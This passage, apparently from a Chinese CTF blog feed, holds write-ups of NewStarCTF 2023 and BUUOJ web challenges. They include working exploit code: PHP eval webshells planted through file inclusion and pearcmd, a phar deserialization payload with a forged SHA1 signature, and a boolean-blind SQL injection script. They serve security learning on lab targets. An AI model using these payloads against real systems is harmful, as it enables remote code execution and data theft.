class="hljs-number">2</span>.<span class="hljs-number">9</span>一直到<span class="hljs-number">7</span>.<span class="hljs-number">3</span>到现在的版本已被修复<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#参考https://www.cnblogs.com/Article-kelp/p/14826360.html</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><br>url=<span class="hljs-string">&quot;http://5efafd4f-4bae-4237-b3b6-5a8e41058c3c.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> <br><br>phpfile=<span class="hljs-string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span> <span class="hljs-comment">#phpfile对应的就是上传的文件的内容</span><br>filedata=&#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:phpfile<br>&#125;<br>bak=res.post(url=url,files=filedata)<br><span class="hljs-built_in">print</span>(bak.text)<br></code></pre></td></tr></table></figure><p>回显：</p><p><img src="/img/ezinclude6.png" alt="ezinclude6"></p><p>接下来就要用到刚才的<code>dir.php</code>了，因为我们上传的一句话被存到<code>tmp</code>目录(文件名我们并不知道，这东西是个临时文件)，访问<code>dir.php</code>就能获得文件名<code>phpgkdwwM</code>：</p><p><img src="/img/ezinclude7.png" alt="ezinclude7"></p><p>蚁剑连接(这里文件名换了是因为环境重开了一次，注意没必要在后面加<code>php</code>后缀)</p><p><img src="/img/ezinlucde1.png" alt="ezinlucde1"></p><p>不过奇怪的是啥都没有。。：</p><p><img src="/img/ezinlucde99.png" alt="ezinlucde99"></p><p>后面想着用蚁剑的插件：</p><p><img src="/img/ezinlude100.png" alt="ezinlude100"></p><p>又去看了wp。。。<code>flag</code>在<code>phpinfo</code>里。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(未做完)Writeup_2023_NewStarCTF_Week5</title>
    <link href="/2023/11/28/week5-Writeup_2023_NewStarCTF_Week5/"/>
    <url>/2023/11/28/week5-Writeup_2023_NewStarCTF_Week5/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第五周，菜鸟的wp</p><span id="more"></span><hr><h2 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h2><p><img src="/img/week51.png" alt="week51"></p><p>源码中存在提示：</p><p><img src="/img/week52.png" alt="week52"></p><p>刷新页面去看<code>cookie</code>：</p><p><img src="/img/week53.png" alt="week53"></p><p>访问<code>pairing.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125; <span class="hljs-comment">//需要绕过__wakeup(),反序列化中__wakeup先于__destruct</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//解码后写入$pear</span><br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<span class="hljs-comment">//检查文件是否存在</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;多吃雪梨&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//https://zhuanlan.zhihu.com/p/377676274</span><br></code></pre></td></tr></table></figure><p>没有<code>Unserialize</code>的反序列化，还是<code>Phar</code>。可以通过<code>__destruct</code>执行命令，但存在<code>__wakeup</code>阻碍(可以通过修改属性数量绕过)。</p><p>参考：<code>https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</code></p><p>主要就是需要修改<code>phar</code>文件的内容(属性数量)才能去绕过<code>__wakeup</code>。但注意<code>phar</code>这个东西是有签名的，我们在此基础上还要对文件签名进行修改。</p><p>先把<code>wakeup</code>放一边：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUser</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;                 <br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">setUser</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /fl*&#x27;</span>;<span class="hljs-comment">//看了wp，看天眼了直接cat /fl*。正常做肯定要一点点执行命令：ls ls /啥的</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>hex</code>打开，修改类属性的个数为<code>5</code>(本来是4)：</p><p><img src="/img/phar12.png" alt="phar12"></p><p>这里借用<code>pankas</code>师傅的一张图：</p><p><img src="/img/phar13.png" alt="phar13"></p><p>签名类型为<code>sha1</code>，伪造签名算法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hacker.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    f = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>() <span class="hljs-comment"># 修改内容后的phar文件,以二进制文件形式打开</span><br>    <br>s = f[:<span class="hljs-number">-28</span>] <span class="hljs-comment"># 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）</span><br>h = f[<span class="hljs-number">-8</span>:] <span class="hljs-comment"># 获取签名类型以及GBMB标识，各4个字节</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week3</title>
    <link href="/2023/11/27/week3_Writeup_2023_NewStarCTF_Week3/"/>
    <url>/2023/11/27/week3_Writeup_2023_NewStarCTF_Week3/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第三周，菜鸟的wp</p><span id="more"></span><hr><h2 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//过滤伪协议及flag</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<span class="hljs-comment">//文件包含漏洞</span><br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>?file=phpinfo</code>,<code>ctrl+F</code>搜索<code>FLAG</code>:</p><p><img src="/img/pear1.png" alt="pear1"></p><p>让我们去查看<code>register_argc_argv</code>:</p><p><img src="/img/pear3.png" alt="pear3"></p><p><code> register_argc_argv</code>开启时我们传入get的参数会被记录在<code>$_SERVER</code>这个全局变量数组中</p><p>并且<code>$argc</code>变量用于记录数组的大小。 <code>$argv</code>变量是用于记录输入参数。</p><p><img src="/img/pear4.png" alt="pear4"></p><p>参考P神的<code>Docker PHP裸文件本地包含综述</code>:</p><p><code>payload</code>:<code>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/hello.php</code></p><p><img src="/img/pearpear2.png" alt="pearpear2"></p><p>注意要在<code>bp</code>上抓包修改，因为<code>URL``get</code>传参时会把<code>&lt;&gt;</code>这种自动编码。</p><p>然后访问<code>/?file=tmp/hello</code></p><p><img src="/img/pearpear3.png" alt="pearpear3"></p><p><img src="/img/pearpear4.png" alt="pearpear4"></p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>先判断字符型还是数字型注入：</p><p><code>/?id=TMP11503&#39;--+  字符型注入</code></p><p><code>or</code>,<code>select</code>过滤了小写，<code>union</code>应该是正则匹配&#x2F;i模式过滤掉了。</p><p><code>?id=TMP0919&#39; And 1=1--+</code>正常回显，<code>?id=TMP0919&#39; And 1=0--+</code>回显<code>id not exists</code></p><p><code>/?id=TMP0919&#39; And if(length(database())&gt;1,1,0)--+</code>正常回显，<code>?id=TMP0919&#39; And if(length(database())&gt;99,1,0)--+</code>回显<code>id not exists</code></p><p>二分法+布尔盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://f74c4214-b1b0-4485-b876-75128295a980.node4.buuoj.cn:81/&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br>        payload = <span class="hljs-string">&quot;TMP0919&#x27;/**/And/**/if(Ascii(Substr(Database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<span class="hljs-comment">#ctf</span><br><span class="hljs-comment">#爆库,注意题目有过滤大小写</span><br><span class="hljs-comment">#if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#ctf</span><br><span class="hljs-comment">#爆表  grades,here_is_flag</span><br><span class="hljs-comment">#if(Ascii(Substr((Select(Group_Concat(Table_Name))From(InfOrmation_Schema.Tables)Where(Table_Schema=&#x27;ctf&#x27;)</span><br><span class="hljs-comment">#爆字段： #if(Ascii(Substr((Select(Group_Concat(Column_name))From(InfOrmation_Schema.Columns)Where(table_name=&#x27;here_is_flag&#x27;))  </span><br><span class="hljs-comment">#爆数据：</span><br><span class="hljs-comment">#if(ascii(substr((select(flag)from(here_is_flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        r = requests.get(url+<span class="hljs-string">&quot;?id=&quot;</span>+payload)<br>        <span class="hljs-comment">#r = requests.get(url=url,params=paylaod)</span><br>        time.sleep(<span class="hljs-number">0.03</span>)<br>        <span class="hljs-comment">#print(r.text)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;TMP0919&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>反序列化中的pop链构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<span class="hljs-comment">//正则匹配name中所有大小写字符及数字，这个name要是个字符串，目测要把某个类赋值给name调用__toString方法</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)//果然有个<span class="hljs-title">__toString</span>，应该要从<span class="hljs-title">__destruct</span>跳到这里</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<span class="hljs-comment">//调用 $func存储的函数，可以利用这个去调用__invoke函数</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)//在对象中调用一个不可访问方法时调用,应该要利用<span class="hljs-title">__invoke</span>跳到这里</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)//调用函数的方式调用一个对象时的回应方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<span class="hljs-comment">//unset，销毁指定变量，通过这个跳到__unset</span><br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)//当对不可访问属性调用<span class="hljs-title">unset</span>(<span class="hljs-params"></span>)时被调用</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <span class="hljs-comment">//函数执行</span><br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <span class="hljs-comment">//反序列化的尾巴</span><br><br><span class="hljs-comment">//https://zhuanlan.zhihu.com/p/377676274</span><br></code></pre></td></tr></table></figure><p>函数调用顺序：</p><p><code>Begin中的__destruct-&gt;Then中的__ToString-&gt;Super中的__invoke-&gt;Handle中的__call-&gt;CTF中的end(unset)-&gt;WhiteGod中的__unset</code></p><p><code>exp:</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 